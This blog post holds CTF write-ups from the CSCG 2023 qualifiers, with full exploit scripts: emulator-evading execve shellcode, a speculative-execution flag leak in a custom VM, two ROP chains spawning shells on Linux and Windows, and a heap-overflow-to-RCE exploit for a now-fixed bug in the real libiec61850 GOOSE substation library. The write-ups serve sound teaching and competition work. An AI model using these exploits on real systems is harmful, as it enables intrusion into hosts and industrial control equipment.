@@ -1,0 +1,827 @@
+---
+layout: post
+title:  "CSCG 2023"
+---
+Over the past month, I participated in the qualifying rounds of the [Cyber Security Challenge Germany](https://cscg.de/) (CSCG), which is part of the [European Cyber Security Challenge](https://ecsc.eu/) (ECSC). This CTF event includes two age categories: junior (14-20) and senior (21-25). Participants compete to secure a spot in the German final, with the top 11 players from each age group qualifying. Ultimately, the top 5 players from each age group in the final form a team to represent Germany in the ECSC challenge.
+
+Although I am no longer eligible for a spot in the final due to my age, I still took part in the open (earth) division of the CTF and secured second place. I enjoyed the challenges and therefore decided to create write-ups for a few of them, specifically: [Release the Unicorn](#unicorn-sec), [VM](#vm-sec), [Once](#once-sec), [Honk! Honk!](#honk-honk-sec) and [ConsoleApplication1](#console-application-sec).
+
+The full exploit codes and challenge files can be found in my [repository](https://github.com/Ollrogge/CtfWriteups).
+
+<h2 id="unicorn-sec">Release the Unicorn</h2>
+Release the Unicorn was a misc shellcoding challenge which utilized the unicorn emulation framework to emulate our provided shellcode and panic if it contained any `syscall` or `sysenter` instructions to prevent us from spawning a shell. If the emulation ran without panic, the shellcode would be executed. The emulation function looked like this:
+
+```rust
+fn emulate_bytecode(code: &Vec<u8>) -> Result<(), uc_error> {
+    let mut unicorn = Unicorn::new(Arch::X86, Mode::MODE_64)?;
+    let emu = &mut unicorn;
+
+    // Setup Memory
+    emu.mem_map(BASE_ADDR, IMG_SIZE as usize, Permission::ALL)?;
+    emu.mem_map(STACK_ADDR, STACK_SIZE as usize, Permission::ALL)?;
+    emu.mem_write(BASE_ADDR, code)?;
+
+    // Setup Registers
+    emu.reg_write(RegisterX86::RSP, STACK_ADDR + STACK_SIZE - 1)?;
+
+    // Add hooks
+    emu.add_insn_sys_hook(InsnSysX86::SYSCALL, 1, 0, |uc| {
+        panic!("[!] Syscall detected: {uc:?}");
+    })?;
+    emu.add_insn_sys_hook(InsnSysX86::SYSENTER, 1, 0, |uc| {
+        panic!("[!] Sysenter detected: {uc:?}");
+    })?;
+
+    // Run emulation
+    emu.emu_start(BASE_ADDR, (BASE_ADDR as usize + code.len()) as u64, 0, 0)?;
+    Ok(())
+}
+```
+
+### Executing arbitrary shellcode
+To execute arbitrary shellcode I used the fact that all registers except `RSP` are zero in the emulation, but not when the shellcode is actually run. We can use this to change the behavior of our shellcode when run in the emulation vs for real. One more little hurdle is that the shellcode can't contain null bytes. My solution was based on a technique I learned while pwning JIT engines: I encoded my shellcode into `mov` instructions and jumped to an offset based on the different registers contents to trigger my payload. With each x64 mov instruction we have an 8 byte immediate value that we can use to encode 6 bytes of shellcode and 2 bytes for a jump to chain our gadgets. This is how the shellcode looks in memory:
+
+![Memory layout](/assets/cscg-unicorn-1.png)
+
+If `rax` is not zero, the shellcode jumps to an offset which contains our actual payload:
+
+![Memory layout](/assets/cscg-unicorn-2.png)
+
+### Exploit
+```python
+def emit(ins):
+    a = asm(ins)
+    if len(a) > 6:
+        print("too big: ", ins, len(ins))
+        exit(0)
+    a += (6 - len(a))*b"\x90"
+    a += asm("jmp $+4")
+
+    inst = f"mov rax, {hex(int.from_bytes(a, 'little'))}"
+
+    return asm(inst)
+
+print("[+] building sc")
+sc = '''
+test rax, rax
+jnz $+4
+'''
+
+sc = asm(sc)
+
+sc += emit("push 0x68")
+sc += emit("mov edx, 0x732f2f2f")
+sc += emit("shl rdx, 32")
+sc += emit("mov ebx, 0x6e69622f")
+sc += emit("add rdx, rbx")
+sc += emit("push rdx")
+sc += emit("mov rdi, rsp")
+
+sc += emit("mov esi, 0x10101010")
+sc += emit(f"sub esi, {hex(0x10101010 - 0x6873)}")
+sc += emit("push rsi")
+
+sc += emit("xor esi, esi")
+sc += emit("push rsi")
+sc += emit("push 8")
+sc += emit("pop rsi")
+sc += emit("add rsi, rsp")
+sc += emit("push rsi")
+sc += emit("mov rsi, rsp")
+
+sc += emit("xor edx, edx")
+sc += emit("push 0x3b")
+sc += emit("pop rax")
+sc += emit("syscall")
+
+sc += b"\x90"*0x80
+```
+
+<h2 id="vm-sec">VM</h2>
+VM was another misc challenge that involved emulating a CPU in its entirety. The CPU uses 5 registers: two general purpose (`r0`, `r1`), stack (`sp`), program counter(`pc`) and zero flag (`zero`). Furthermore the cpu defines a bunch of the usual instructions such as `jmp`, `add`, `push` and an interrupt instruction for IO access. For the challenge one could send instructions to the VM that would get executed.
+
+The VM consists of two threads: an executor and a validator thread. The executor thread simply executes the instructions, and after executing, sends information about the executed instructions to the validator. The validator then validates the executed instructions. The executor thread uses temporary registers. Only after the instructions have been validated, the actual CPU registers will be modified by the validator thread.
+
+The flag is read into a memory region with no permissions. Attempting to read the flag will result in the validator stopping the execution, as the access to the non-readable memory region is invalid. Therefore, the objective of the challenge was to find a way to read the flag within the executor thread without triggering the validator's detection of the unauthorized access.
+
+As this CPU emulation is very detailed, it also emulates CPU caches, speculative execution and out of order execution. The executor thread will speculatively execute up to 8 instructions before waiting for the validator to catch up. When speculatively executing, the executor thread will save the assumed values of r0 and r1 in order for the validator to later check the speculative execution. IO instructions (write, read) are guaranteed to be in-order and won't be predicted. They are the only kind of instruction that is actually handled by the validator instead of the executor thread. Following shows an example of how the `sub` instruction is implemented, including the code for the assumed register values:
+
+```rust
+// R0 = R0 - R1
+InsnType::Sub => {
+    assume.r0 = Some(regs.r0);
+    assume.r1 = Some(regs.r1);
+
+    let mask = maskx(self.op_size);
+
+    regs.r0 = (regs.r0 & !mask) | ((regs.r0.overflowing_sub(regs.r1).0) & mask);
+
+    regs.zero = (regs.r0 & mask) == 0;
+
+    let result = ExecutionResult {
+        regs: regs.clone(),
+        read_at: None,
+        write_at: None,
+        io_request: None,
+    };
+
+    Some(Execution { assume, result })
+}
+```
+
+Upon validating the executed instructions, the validator will compare the assumed register values with the current validated values of the real registers. If they are not equal, the predicted execution was incorrect and a reset is triggered. This will reset the executor registers to the latest validated values of the real registers, forcing execution of the correct instructions. Additionally, when the mispredicted instruction was a write instruction, the cache is also reset.
+
+```rust
+if &execution.assume == regs {
+    ...
+} else {
+    VerificationResult::Reset(execution.result.write_at.is_some())
+}
+```
+
+### Leaking the flag
+We can take advantage of speculative execution and the fact that the cache only resets upon a mispredicted write instruction to leak the flag. Our strategy involves loading portions of the flag into the cache, initiating a reset so that the validator does not panic due to unauthorized access, and then extracting parts of the flag by reading it from the cache.
+
+To reliably trigger a reset we will use the IO read instruction in order to halt the validator thread and speculatively execute instructions to read parts of the flag into the cache. The same IO read instruction will further read a value into the `r0` register which will trigger a reset. After the reset we will continue execution at code that will print out parts of the flag.
+
+### Exploit
+```python
+# r1 = [addr]
+def load_addr(addr):
+    i = b''
+    i += Inst.LOAD.encode()
+    i += p32(addr)
+
+    return i
+
+# addr = r1
+def store(addr):
+    i = b''
+    i += Inst.STORE.encode()
+    i += p32(addr)
+
+    return i
+
+def int_write():
+    i = b''
+    i += Inst.INT.encode()
+    i += b'o'
+
+    return i
+
+def int_read():
+    i = b''
+    i += Inst.INT.encode()
+    i += b'i'
+
+    return i
+
+def mov_r0_r1():
+    i = b''
+    i += Inst.MOV_R0_R1.encode()
+
+    return i
+
+def mov_r1_r0():
+    i = b''
+    i += Inst.MOV_R1_R0.encode()
+
+    return i
+
+def add():
+    i = b''
+    i += Inst.ADD.encode()
+
+    return i
+
+def sub():
+    i = b''
+    i += Inst.SUB.encode()
+
+    return i
+
+def nop():
+    i = b''
+    i += Inst.NOP.encode()
+
+    return i
+
+def jmp_neq(addr):
+    i = b''
+    i += Inst.JMP_NE.encode()
+    i += p32(PC + addr)
+
+    return i
+
+def halt():
+    i = b''
+    i += Inst.HALT.encode()
+
+    return i
+
+class Inst:
+    PUSH_R0 = 'p'
+    PUSH_R1 = 'P'
+    POP_R0 = 'q'
+    POP_R1 = 'Q'
+    CALL = 'C'
+    RET = 'R'
+    JMP_R0 = 'j'
+    JMP = 'J'
+    JMP_EQ_R0 = 'e'
+    JMP_EQ = 'E'
+    JMP_NE_R9 = 'n'
+    JMP_NE = 'N'
+    ADD = '+'
+    SUB = '-'
+    AND = '&'
+    OR = '|'
+    XOR = '^'
+    MOV_R0_R1 = '>'
+    MOV_R1_R0 = '<'
+    MOV_R0 = 'm'
+    MOV_R1 = 'M'
+    LOAD_R0 = 'l'
+    LOAD = 'L'
+    STORE_R0 = 's'
+    STORE = 'S'
+    INT = '#'
+    NOP = '.'
+    HALT = 'H'
+
+PC = 0x100000
+SP = 0x200000
+FLAG = 0x300000
+MM = 0x400000
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+# pwndbg tele command
+gdbscript = '''
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+flag = b""
+i = 0x0
+while i < 0x10:
+    payload = b''
+    # io access, block validator
+    # read will store data in r0
+    payload += int_read()
+    # speculation: r0 - r1 = 0x0
+    payload += sub()
+    # speculation: don't take jump
+    payload += jmp_neq(0x20)
+    # +0x2 otherwise last access will reach EOF and return 0
+    payload += load_addr(FLAG + i * 0x4+0x2)
+    # store flag bytes, will also store them in cache
+    payload += store(MM)
+    payload = payload.ljust(0x20, nop())
+    # after reset 0x42 read will cause jump to be taken
+    # reset however did not clear cache => can load flag bytes from cache
+    payload += load_addr(MM)
+    payload += mov_r0_r1()
+    payload += int_write()
+    payload += halt()
+
+    with open("prog.bin", 'wb') as f:
+        f.write(payload)
+
+    io = start(argv, env=env)
+    if args.LOCAL:
+        io.send(p32(0x42))
+        leak = io.recv(100, timeout=0.5)
+        print(leak)
+        if leak != p32(0x0):
+            flag += leak
+            print(f"Flag: {flag}, index: {i}")
+            i += 1
+    else:
+        io.sendlineafter("hex:", payload.hex())
+        io.send(p32(0x42))
+
+        leak = io.recv(4)
+        if leak != p32(0x0):
+            flag += leak
+            print(f"Flag: {flag}, index: {i}")
+            i += 1
+
+    if b'}' in flag:
+        break
+
+    io.close()
+
+print("Flag: ", flag)
+```
+
+<h2 id="once-sec">Once</h2>
+
+Once was a ROP pwn challenge. The code is very small and simple:
+```c
+void provide_a_little_help() {
+  const char* needle = NULL;
+  const char* needles[] = {
+    "libc",
+    "once",
+    "[heap]",
+    "[stack]",
+    NULL
+  };
+  int i = 0;
+  char buf[512] = {0};
+
+  FILE* fp = fopen("/proc/self/maps", "r");
+  if (!fp) {
+    perror("fopen");
+    exit(1);
+  }
+
+  while((needle = needles[i]) != NULL) {
+    if (!fgets(buf, sizeof(buf), fp) || !buf[0]) {
+      break;
+    }
+
+    //printf("Buf: %s needle: %s \n", needle, buf);
+
+    if (strstr(buf, needle)) {
+      *strchr(buf, ' ') = '\0';
+      printf("%s: %s\n", needle, buf);
+      i++;
+    }
+}
+
+int main() {
+  unsigned char buf[0];
+
+  provide_a_little_help();
+
+  fread(buf, 1, 0x10, stdin);
+
+  return 0;
+}
+```
+The challenge reads 16 bytes from stdin, causing an overflow that will overwrite the saved `rbp` and `rip` on the stack, giving us control over the execution. In addition, the `provide_a_little_help` function displays the address ranges of stack, heap, and the application itself.
+
+Ideally, we want to execute a rop chain that will call `system("/bin/sh")`. In order to achieve this there are two apparent obstacles: First, we need to be able to provide a longer rop chain than 2 gadgets (16 bytes), second we need a libc leak.
+
+The first obstacle can be solved quite easily by leveraging the internal buffer of the stdin FILE structure. Even though only 16 bytes are read into the buffer on the stack, we can provide a lot more bytes which will be stored in the internal buffer of the FILE structure located on the heap. This enables us to pivot to the heap and execute a longer rop chain.
+
+The second obstacle can probably be solved in many ways. I used the `provide_a_little_help` function to obtain a libc leak. By setting up a fake stackframe and returning into the `provide_a_little_help` function at an offset we can leverage the function to search and print the address of libc for us.
+
+After having overcome these two obstacles, I encountered a third obstacle I didn't previously account for. Since we filled up the internal buffer of stdin, we have to first empty the buffer somehow until we can read in the second part of our rop chain which uses the obtained libc leak to return to `system`. After many tries I managed to empty the stdin buffer and get another read by setting up a fake stackframe that contained a pointer to stdin and then returning to the `fgets` call in the `provide_a_little_help` function.
+
+Having overcome this last obstacle, we can simply overflow the stack again with the second read and execute our `system("/bin/sh")` rop chain.
+
+### Exploit
+```python
+io = start(argv, env=env)
+
+pattern = r'([0-9a-fA-F]+)'
+
+once = io.recvline().decode()
+once = [int(x, 16) for x in re.findall(pattern, once)]
+once = once[1:]
+print("Once: " + " ".join(hex(x) for x in once))
+
+bin_base = once[0]
+
+heap = io.recvline().decode()
+heap = [int(x, 16) for x in re.findall(pattern, heap)]
+heap = heap[1:]
+print("Heap: " + " ".join(hex(x) for x in heap))
+
+heap_base = heap[0]
+
+stack = io.recvline().decode()
+stack = [int(x, 16) for x in re.findall(pattern, stack)]
+stack = stack[1:]
+
+print("Stack: " + " ".join(hex(x) for x in stack))
+
+my_input = heap_base + 0x18a0 + 0x10 # remote
+
+print("Heap my input: ", hex(my_input))
+rsp_begin = stack[1] - 0x1640
+
+print("RSP begin: ", hex(rsp_begin))
+
+# pivot to heap
+payload = p64(my_input)
+payload += p64(bin_base + 0x1312) #nop; leave; ret
+payload += p64(my_input + 0x80) # rbp
+
+# set up stackframe so that provide_little_help
+# searches for libc and prints out its address
+payload += p64(bin_base + 0x11ed)
+payload += b"B"*0x30
+payload += p64(my_input + 0x50)
+payload += p64(0)
+
+# libc specific values (simply providing "libc" string didn't work for some reason)
+# payload +=b"14300" # local
+payload +=b"26000" # remote
+payload += p64(0)
+payload += b"B"*35
+
+# return to main fread in order to get stdin
+# pointer onto our fake heap stack
+payload += p64(my_input)
+payload += p64(bin_base + 0x1323)
+
+# return to fgets in provide_little_help func
+# passing in the stdin ptr on our fake heap stack
+print("Stdin ptr ?: ", hex(my_input + 0x8+0x18))
+#payload += p64(bin_base + 0x4020+0x18) #rbp, fread
+payload += p64(my_input + 0x8 +0x18)
+payload += p64(bin_base + 0x126a)
+
+print("payload len: ", hex(len(payload)))
+
+io.send(payload)
+
+io.recvuntil("26000: ") # remote
+#io.recvuntil("14300: ")
+
+libc.address = int(io.recv(12), 0x10)
+print("Leak: ", hex(libc.address))
+
+# overflow a buffer somewhere in fgets call and win
+payload = b"A"*0x10
+payload += p64(my_input -0x100)
+payload += p64(libc.address+0x27456) # ret
+payload += p64(libc.address + 0x27ab5) #pop rdi; ret
+payload += p64(next(libc.search(b"/bin/sh")))
+payload += p64(libc.sym['system'])
+payload += b"A"*0x8
+
+#gdb.attach(io, gdbscript)
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+<h2 id="honk-honk-sec">Honk! Honk!</h2>
+Honk! Honk! was a pwn challenge and the most interesting challenge to me as it required to find and exploit a zero day in the GOOSE protocol implementation of the [libiec61850](https://github.com/mz-automation/libiec61850) library. The GOOSE (Generic Object-Oriented Substation Event) protocol is a communication protocol used in electrical substations for exchanging status and event data over an Ethernet network.
+
+The challenge builds the `goose_subscriber_example` application without PIE enabled and with a small patch applied which causes the `system` function to be used by the application. This is helpful for exploitation as we will see. The GOOSE subscriber listens on the loopback interface for incoming GOOSE messages sent by publishers, parses them and then simply prints information about the messages.
+
+The GOOSE subscriber parses the incoming messages by calling the `parseGooseMessage` function. This function parses GOOSE messages in two different ways depending on if this is the first message of a kind received from a specific publisher or not. If a publisher sends a new kind of message the `parseAllDataUnknownValue` function will be called, else the `parseAllData` function.
+
+
+### Bug
+Scrolling through the commit history of the repository, we can find a [commit](https://github.com/mz-automation/libiec61850/commit/30217b41cce7805ce291b967a92f760483fc43fe) which fixed vulnerabilities related to malformed bit-string, integer, and unsigned values. The fix however only changed the `parseAllDataUnknownValue` function but not the `parseAllData` function. Below are the two versions for parsing the bit-string data type:
+
+
+**parseAllDataUnknownValue:**
+```c
+case 0x84: /* BIT STRING */
+{
+    if (elementLength > 1) {
+        int padding = buffer[bufPos];
+        int rawBitLength = (elementLength - 1) * 8;
+
+        if (padding > 7) {
+            if (DEBUG_GOOSE_SUBSCRIBER) {
+                printf("GOOSE_SUBSCRIBER:      invalid bit-string (padding not plausible)\n");
+            }
+
+            goto exit_with_error;
+        }
+        else {
+            value = MmsValue_newBitString(rawBitLength - padding);
+            memcpy(value->value.bitString.buf, buffer + bufPos + 1, elementLength - 1);
+        }
+    }
+    else {
+        if (DEBUG_GOOSE_SUBSCRIBER) {
+            printf("GOOSE_SUBSCRIBER:      invalid bit-string\n");
+        }
+
+        goto exit_with_error;
+    }
+}
+break;
+```
+**parseAllData:**
+```c
+case 0x84: /* BIT STRING */
+    if (MmsValue_getType(value) == MMS_BIT_STRING) {
+        int padding = buffer[bufPos];
+        int bitStringLength = (8 * (elementLength - 1)) - padding;
+        if (bitStringLength == value->value.bitString.size) {
+            memcpy(value->value.bitString.buf, buffer + bufPos + 1,
+                   elementLength - 1);
+        }
+        else {
+            pe = GOOSE_PARSE_ERROR_LENGTH_MISMATCH;
+        }
+    }
+    else {
+        pe = GOOSE_PARSE_ERROR_TYPE_MISMATCH;
+    }
+    break;
+```
+
+Comparing the two we can see that the code in the `parseAllData` function does not check the padding length supplied. We can use this to achieve a heap overflow.
+
+Consider the following example: We create a new bit-string with an `elementLength` of 25 bytes and 0 padding. Based on the `parseAllDataUnknownValue` function this will create a bit-string with a `rawBitLength` of (25-1)*8 = 192 bits. Afterwards we send the same type of message again but now we supply an `elementLength` of 56 and padding of 248. Based on the `parseAllData` function the `bitStringLength` will correspond to (8 * (56 - 1)) - 248 = 192 bits, so the same `bitStringLength` as our initial bit-string ! However, the `elementLength` used for the `memcpy` is actually 55 bytes instead of 24 bytes, causing a heap overflow.
+
+### Gaining RCE
+To gain code execution, I used the heap overflow to corrupt a metadata structure (`MmsValue`) of another bit-string. The important parts of the `MmsValue` structure are shown below:
+```c
+ MmsType type;
+    uint8_t deleteValue;
+    union uMmsValue {
+       ...
+        struct {
+            int size;     /* Number of bits */
+            uint8_t *buf;
+        } bitString;
+        ...
+    } value;
+```
+
+I corrupted the `buf` pointer of a bit-string to point to the `GOT` of the `memcpy` function. Afterwards I overwrote the `memcpy` entry with the address of the `PLT` stub of the `system` function and by that gained code execution on the next call to memcpy.
+
+The heap overflow bug has now been [fixed](https://github.com/mz-automation/libiec61850/commit/f41667367a0c9841400bd3e50415db8a5301b7ad).
+
+### Exploit
+```python
+def build_pkt(payload):
+    buf = b'\x01\x0c\xcd\x01\x00\x01' #dstmac
+    buf += p8(0x41)*6 #srcmac
+    buf += p8(0x88)
+    buf += p8(0xb8)
+    buf += p16(1000, endian='big')
+    buf += p16(len(payload)+0x8, endian='big') #len
+    buf += p8(0)*4 # reserved field
+    buf += payload
+
+    return buf
+
+gocbref = b"simpleIOGenericIO/LLN0$GO$gcbAnalogValues"
+
+def el(l):
+    buf = p8(0x4 | 0x80)
+    buf += p32(l, endian='big')
+    return buf
+
+def build_all_data(padding, payload, payload2=None):
+    buf = p8(0x84) # bit string
+    buf += el(len(payload)+1)
+    buf += p8(padding)
+    buf += payload
+
+    buf += p8(0x84) # bit string
+    buf += el(0x10+1)
+    buf += p8(0x0)
+    if payload2:
+        buf += payload2
+    else:
+        buf += b"B"*0x10
+
+    return buf
+
+def build_goose(len_data):
+    buf = p8(0x80) #gocbref
+    buf += el(len(gocbref))
+    buf += gocbref
+    buf += p8(0xab) # all data
+    buf += el(len_data)
+    buf = el(len(buf)) + buf
+    return buf
+
+def combine_pkt(goose, data):
+    buf = p8(0x61)
+    buf += goose
+    buf += data
+    return buf
+
+def print_pkt(pkt):
+    buf = "uint8_t buf[] = {"
+    for b in pkt:
+        buf += f"{hex(b)}, "
+
+    buf += "}"
+    print(buf)
+    print("")
+
+def send_pkt(pkt):
+    print("Sending: ", len(pkt))
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+    s.bind(('lo', 0))
+
+    print_pkt(pkt)
+
+    s.send(pkt)
+
+def get_overflow(sz):
+    return (sz*8 + 248) // 8
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+# pwndbg tele command
+gdbscript = '''
+break *0x406baf
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+io = start(argv, env=env)
+
+# initial allocation of dataSetValues
+# parseAllDataUnknownValue
+payload = b"A"*0x18
+all_data = build_all_data(0x0,payload)
+goose = build_goose(len(all_data))
+pkt = combine_pkt(goose, all_data)
+pkt = build_pkt(pkt)
+send_pkt(pkt)
+
+# edit existing dataSetValues
+# parseAllData
+# trigger oob write to overwrite adjacent MmsValue struct
+payload = b"chmod 666 /flag"
+payload = payload.ljust(0x18, b'\x00')
+# 0x20 chunk PREV_INUSE | IS_MAPPED
+payload += p64(0x25)
+# 3 = type (bitstring), 0x80 = bit size
+payload += p64(0x0000800000000003)
+payload += p8(0x0)*5
+# overwrite bitstring buf pointer with GOT of memcpy
+payload += p64(elf.got['memcpy'])
+
+payload = payload.ljust(get_overflow(0x18), b'\x00')
+
+print("elementLength: ", get_overflow(0x18))
+
+# overwrite memcpy got entry with system PLT stub
+payload2 = p64(0x4010e0) + p64(0x4011f0)
+
+#payload = b"A"*get_overflow(0x18)
+all_data = build_all_data(248,payload, payload2)
+goose = build_goose(len(all_data))
+pkt = combine_pkt(goose, all_data)
+pkt = build_pkt(pkt)
+send_pkt(pkt)
+
+io.interactive()
+```
+<h2 id="console-application-sec">ConsoleApplication1</h2>
+ConsoleApplication1 was a windows pwn challenge. The source code for this challenge is very simple and small:
+```cpp
+#include <iostream>
+
+int main()
+{
+    int64_t val, pos;
+    int64_t* ptr = &val;
+
+    std::cout << "Hello World!\n";
+
+    while (1)
+    {
+        std::string cmd;
+        std::cout << "Do?\n";
+        std::cin >> cmd;
+
+        switch (cmd[0])
+        {
+        case 'w':
+            std::cout << "pos: ";
+            std::cin >> pos;
+            std::cout << "val: ";
+            std::cin >> val;
+            ptr[pos] = val;
+            break;
+        case 'r':
+            std::cout << "pos: ";
+            std::cin >> pos;
+            std::cout << ptr[pos] << "\n";
+            break;
+        default:
+            return 0;
+        }
+    }
+}
+```
+
+As can be seen, we can read and write at arbitrary offsets of a variable on the stack. My approach was to build a rop chain and execute `winexec("cmd.exe")`. For the address of the `cmd.exe` string and a `ret` gadget I leaked the address of `ucrtbase.dll` from the stack and for the address of `winexec` and a `pop rcx; ret` gadget I leaked the address of `kernel32.dll` also from the stack.
+
+The hardest part of this challenge for me was to find the correct remote offset of `ucrtbase.dll` as there is no simple way like `LD_PRELOAD` on Linux to preload a library :P
+
+### Exploit
+```python
+from pwintools import *
+
+DEBUG = False
+if DEBUG:
+	io = Process([b"AppJailLauncher.exe", b'/nojail', b'/port:4444', b'ConsoleApplication1.exe']) # Spawn chall.exe process
+	r = Remote("127.0.0.1", 4444)
+	#r.spawn_debugger(breakin=False)
+	#log.info("WinExec @ 0x{:x}".format(r.symbols['kernel32.dll']['WinExec']))
+else:
+	r = Remote("34.79.30.147", 4444)
+
+def leak(off):
+	r.recvuntil(b"Do?")
+	r.sendline(b"r")
+	r.recvuntil(b"pos:")
+	r.sendline(str(off).encode())
+
+def write(off, val):
+	r.recvuntil(b"Do?")
+	r.sendline(b"w")
+	r.recvuntil(b"pos:")
+	r.sendline(str(off).encode())
+	r.recvuntil(b"val:")
+	r.sendline(str(val).encode())
+
+
+'''
+approach: call winexec("cmd.exe")
+
+chain:
+	pop rcx, ret
+	<cmd.exe string in ucrtbase>
+	ret (stack alignment)
+	winexec
+'''
+
+leak(0x10)
+kernel32 = int(r.recvline())
+
+print("kernel32 leak ? ", hex(kernel32))
+
+if DEBUG:
+	kernel32 -= 0x17614
+else:
+	kernel32 -= 0x14de0
+
+print("kernel32: ", hex(kernel32))
+
+leak(0x8)
+binary =  int(r.recvline())
+print("binary: ", hex(binary))
+
+if DEBUG:
+	leak(-46)
+else:
+	leak(-130)
+ucrtbase = int(r.recvline())
+
+print("ucrtbase leak ?", hex(ucrtbase))
+
+if DEBUG:
+	ucrtbase = ucrtbase - 0xef4e8
+else:
+	ucrtbase = ucrtbase - 0x78c7
+
+if DEBUG:
+	cmd_str = ucrtbase + 0xd0cb0
+	ret = kernel32 + 0x1051
+	pop_rcx_ret = ucrtbase + 0x2aa80
+	winexec = io.symbols['kernel32.dll']['WinExec']
+else:
+	cmd_str = ucrtbase + 0xdefd0
+	pop_rcx_ret = ucrtbase + 0x2ef50
+	ret = ucrtbase + 0x1037
+	winexec = kernel32 + 0x1280
+
+pop_rdx_ret4 = kernel32 + 0x68812
+
+print("Pop rcx_ret: ", hex(pop_rcx_ret))
+print("Pop rdx_ret4: ", hex(pop_rdx_ret4))
+
+print("ucrtbase: ", hex(ucrtbase))
+print("cmd.exe string: ", hex(cmd_str))
+
+'''
+for i in range(-200, 0):
+	leak(i)
+	l =  int(r.recvline())
+	print("leak: ", hex(l),  i)
+'''
+
+# 33 , 34
+write(8, pop_rcx_ret)
+write(9, cmd_str)
+write(10, ret)
+write(11, winexec)
+write(12, winexec)
+
+r.recvuntil(b"Do?")
+r.sendline(b"1")
+
+r.interactive()
+```
